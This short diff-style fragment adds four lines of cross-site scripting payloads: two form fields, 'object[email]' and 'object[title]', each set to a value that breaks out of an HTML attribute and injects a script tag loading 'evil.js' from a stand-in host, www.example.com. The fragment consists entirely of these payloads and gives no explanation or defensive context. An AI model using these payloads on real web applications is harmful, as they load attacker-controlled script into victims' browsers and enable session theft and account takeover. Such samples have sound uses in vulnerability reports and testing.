@@ -1,0 +1,4 @@
+1-object%5Bemail5D= "><script 
+src=http://www.example.com/scripts/evil.js></script>
+2-object%5Btitle5D= "><script 
+src=http://www.example.com/scripts/evil.js></script>
